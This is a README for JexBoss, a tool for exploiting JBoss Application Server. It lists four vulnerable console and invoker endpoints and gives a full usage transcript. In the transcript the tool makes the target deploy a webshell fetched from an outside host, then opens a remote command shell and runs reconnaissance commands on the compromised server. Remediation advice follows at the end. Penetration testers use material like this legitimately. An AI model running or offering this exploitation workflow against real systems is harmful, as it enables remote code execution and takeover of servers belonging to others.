JexBoss - Jboss verify and EXploitation Tool
=======

JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server.

Requirements
----
* Python >= 2.7.x
* [urllib3](https://pypi.python.org/pypi/urllib3)

Installation
----
To install the latest version of JexBoss, please use the following commands:

	git clone https://github.com/joaomatosf/jexboss.git
	cd jexboss
	python jexboss.py

	OR:

	Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip
	unzip master.zip
	cd jexboss-master
	python jexboss.py

Features
----
The tool and exploits were developed and tested for versions 3, 4, 5 and 6 of the JBoss Application Server.

The exploitation vectors are:

* /admin-console [ NEW ]
	- tested and working in JBoss versions 5 and 6
* /jmx-console
	- tested and working in JBoss versions 4, 5 and 6
* /web-console/Invoker
	- tested and working in JBoss versions 4
* /invoker/JMXInvokerServlet
	- tested and working in JBoss versions 4 and 5

Usage example
----
* Check the file "demo.png"

```
* Via git:

$ git clone https://github.com/joaomatosf/jexboss.git
$ cd jexboss
$ python jexboss.py https://site-teste.com

* Or via download:

$ wget https://github.com/joaomatosf/jexboss/archive/master.zip
$ unzip master.zip
$ cd jexboss-master
$ python jexboss.py https://site-teste.com


 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#


 ** Checking Host: https://site-teste.com **

 * Checking admin-console: 	       [ EXPOSED ]
 * Checking web-console: 	       [ OK ]
 * Checking jmx-console: 	       [ VULNERABLE ]
 * Checking JMXInvokerServlet: 	   [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   This operation will provide a simple command shell to execute commands on the server..
   Continue only if you have permission!
   yes/NO ? yes

 * Sending exploit code to https://site-teste.com. Wait...


 * Info: This exploit will force the server to deploy the webshell
   available on: http://www.joaomatosf.com/rnp/jbossass.war
 * Successfully deployed code! Starting command shell, wait...

 * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - *

 * https://site-teste.com:

 Linux seglinux 3.18.4-1.el6.elrepo.x86_64 #1 SMP Wed Jan 28 13:28:52 EST 2015 x86_64 x86_64 x86_64 GNU/Linux

 CentOS release 6.5 (Final)

 uid=509(jboss) gid=509(jboss) grupos=509(jboss) context=system_u:system_r:initrc_t:s0

[Type commands or "exit" to finish]
Shell> pwd
/usr/jboss-6.1.0.Final/bin

[Type commands or "exit" to finish]
Shell> hostname
fwgw

[Type commands or "exit" to finish]
Shell> ls -all /home
total 16
drwxr-xr-x.  4 root  root  4096 Jan 26  2015 .
dr-xr-xr-x. 23 root  root  4096 Mar 31 04:51 ..
-rwxrwxrwx.  1 root  root     0 Jan 26  2015 file1
-rw-r-----.  1 root  root     0 Jan 26  2015 file2
-rw-rw-r--.  1 root  root     0 Jan 26  2015 file3
drwx------.  2 joao  joao  4096 Jan 26  2015 joao
drwx------.  2 maria maria 4096 Jan 26  2015 maria

[Type commands or "exit" to finish]
Shell>exit

Results: potentially compromised server!
 * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*
 Recommendations:
 - Remove web consoles and services that are not used, eg:
    $ rm web-console.war
    $ rm http-invoker.sar
    $ rm jmx-console.war
    $ rm jmx-invoker-adaptor-server.sar
    $ rm admin-console.war
 - Use a reverse proxy (eg. nginx, apache, F5)
 - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)
 - Search vestiges of exploitation within the directories "deploy" and "management".

 References:
   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole
   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf

 - If possible, discard this server!
 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*

 * Info: review, suggestions, updates, etc:
   https://github.com/joaomatosf/jexboss

 * DONATE: Please consider making a donation to help improve this tool,
           including research to new versions of JBoss and zero days.

 * Paypal:  joaomatosf@gmail.com
 * Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C
 * URI:  bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss
```

Questions, problems, suggestions and etc:
----

* joaomatosf@gmail.com


